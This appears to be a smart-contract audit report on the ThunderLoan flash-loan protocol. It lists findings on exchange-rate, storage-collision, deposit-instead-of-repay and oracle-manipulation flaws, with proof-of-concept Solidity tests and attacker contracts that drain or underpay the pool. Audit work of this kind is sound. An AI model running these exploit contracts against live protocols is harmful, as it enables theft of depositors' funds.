# HIGH

### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees that it really does, which blocks redemption and incorrectly sets the exchange rate

**Description** In `ThunderLoan.sol`, the `exchangeRate` is responsible for calculating the the exchange rate between assetTokens and underlying tokens. In a way, it's responsible for keeping track of how many fees to give to liquidity providers.

However, the `deposit` function, updates this rate, without collecting any fees!

```javascript
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
@>>     uint256 calculatedFee = getCalculatedFee(token, amount);
@>>     assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact** There are several impacts to this bug:
1. The `redeem` function is blocked, because the protocol thinks the owed token is more than it has
2. Rewards are incorrectly calculated, leading to users potentially getting way more or less than deserved

**Proof of Concept**

1. LP deposit
2. User takes out a flash loan
3. It is now impossible for LP to redeem

<details>
<summary>Proof of Code</summary>

```javascript
    function testReedemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT); // fee
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        // 1000e18 initial deposit
        // 3e17 fee
        // 1000e18 + 3e17 = 1003e17
        // 1003.300900000000000

        uint256 amountToReedem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToReedem);
        vm.stopPrank();
    }
```
</details>

**Recommended Mitigation** Remove the incorrectly updated exchange rate in the `deposit` function.

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`

**Description:** `ThunderLoan.sol` has two variables in the following order:

```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```

However, the expected upgraded contract `ThunderLoanUpgraded.sol` has them in a different order. 

```javascript
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

Due to how Solidity storage works, after the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the positions of storage variables when working with upgradeable contracts. 


**Impact:** After upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally the `s_currentlyFlashLoaning` mapping will start on the wrong storage slot.

**Proof of Code:**

<details>
<summary>Code</summary>
Add the following code to the `ThunderLoanTest.t.sol` file. 

```javascript
// You'll need to import `ThunderLoanUpgraded` as well
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeTo(address(upgraded));
        uint256 feeAfterUpgrade = thunderLoan.getFee();

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```
</details>

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`

**Recommended Mitigation:** Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant. In `ThunderLoanUpgraded.sol`:

```diff
-    uint256 private s_flashLoanFee; // 0.3% ETH fee
-    uint256 public constant FEE_PRECISION = 1e18;
+    uint256 private s_blank;
+    uint256 private s_flashLoanFee; 
+    uint256 public constant FEE_PRECISION = 1e18;
```

### [H-3] By calling a flashloan and then `ThunderLoan::deposit` instead of `ThunderLoan::repay` users can steal all funds from the protocol

**Description** When a flashloan is active, the protocol checks repayment by verifying the AssetToken's ending balance is higher than the starting balance. But it never checks how that balance increased. So a borrower can call deposit() (which transfers tokens in and mints assetTokens to them) instead of repay(). This satisfies the balance check, but now the attacker holds assetTokens redeemable for the full loaned amount — they effectively get the loan for free and can drain the pool.

**Impact** Complete theft of all protocol liquidity. Any user can drain the entire pool of any allowed token in a single transaction with only the fee amount as upfront capital.

**Proof of Code**
<details>
<summary>Proof of Code</summary>

```javascript
    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.reedemMoney();
        vm.stopPrank();

        assertGt(tokenA.balanceOf(address(dor)), 50e18 + fee);
    }

    contract DepositOverRepay is IFlashLoanReceiver {

    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan){
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/) external returns (bool) {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function reedemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}

```
</details>

**Recommended Mitigation**

Track whether repayment came through the legitimate repay function, not just a balance check. One approach:

```diff
+   mapping(IERC20 token => bool) private s_flashloanActive;

    function flashloan(...) {
+       s_flashloanActive[token] = true;
        // ... existing logic ...
+       s_flashloanActive[token] = false;
    }

    function deposit(IERC20 token, uint256 amount) external {
+       if (s_flashloanActive[token]) revert ThunderLoan__CannotDepositDuringFlashloan();
        // ... existing logic ...
    }
```
Alternatively, add a dedicated repayment path that clears a debt slot, and reject any deposit call originating within a flashloan callback.

# MEDIUM


### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attacks

**Description** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact** Liquidity providers will drastically reduced fees for providing liquidity.

**Proof of Concept**

The following all happens in 1 transaction.

1. User takes a flash loan from ThunderLoan for 1000 tokenA. They are charged the original fee fee1. During the flash loan, they do the following:
- User sells 1000 tokenA, tanking the price.
- Instead of repaying right away, the user takes out another flash loan for another 1000 tokenA.
    - Due to the fact that the way ThunderLoan calculates price based on the TSwapPool this second flash loan is substantially cheaper.

```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```

2. The user then repays the first flash loan, and then repays the second flash loan.

<details>
<summary>Proof of Code</summary>

```javascript
    function testOracleManipulation() public {
        // set up fresh instances
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();

        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // create a TSwap Dex between tokenA and weth
        address tSwapPool = pf.createPool(address(tokenA));

        // encode initialize call and pass to proxy (atomic init)
        bytes memory initData = abi.encodeWithSelector(
            ThunderLoan.initialize.selector,
            address(pf)
        );

        proxy = new ERC1967Proxy(address(thunderLoan), initData);

        // cast proxy to ThunderLoan interface
        thunderLoan = ThunderLoan(address(proxy));

        // fund tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tSwapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tSwapPool), 100e18);
        BuffMockTSwap(tSwapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();

        // Ratio = 100 WETH : 100 TokenA
        // Price = 1 : 1

        // fund thunderloan
        // set allow
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        // fund
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // Ratio = 100 WETH : 1100 TokenA
        // Price = 1 : 11

        // flashloan 1
        uint256 amountToBorrow = 1000e18;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        // Ratio = 100 WETH : 1000 TokenA
        // Price = 1 : 10

        // flashloan 2
        uint256 calculatedFee2 = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        // Ratio = 100 WETH : 900 TokenA
        // Price = 1 : 9

        // repay
        vm.startPrank(user);
        tokenA.approve(address(thunderLoan), AMOUNT * 2);
        thunderLoan.repay(tokenA, AMOUNT * 2);
        vm.stopPrank();
    }

    contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {

    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tSwapPool;
    bool attacked = false;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tSwapPool, address _thunderLoan, address _repayAddress){
        tSwapPool = BuffMockTSwap(_tSwapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/) external returns (bool) {
        if(!attacked){
            // 1. Swap TokenA borrowed for WETH
            // 2. Take out another flash loan, to show the difference
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tSwapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tSwapPool), 50e18);
            // tanks the price
            tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // we call a second flash loan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");

            // repay 
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(token, amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate fee and repay
            feeTwo = fee;
            // repay 
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(token, amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}
```
</details>

**Recommended Mitigation** Use a price oracle that is not susceptible to manipulation, such as Chainlink Price Feeds.

### [M-2] Centralization risk for trusted owners

#### Impact:
Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

*Instances (2)*:
```solidity
File: src/protocol/ThunderLoan.sol

223:     function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {

261:     function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
```

#### Contralized owners can brick redemptions by disapproving of a specific token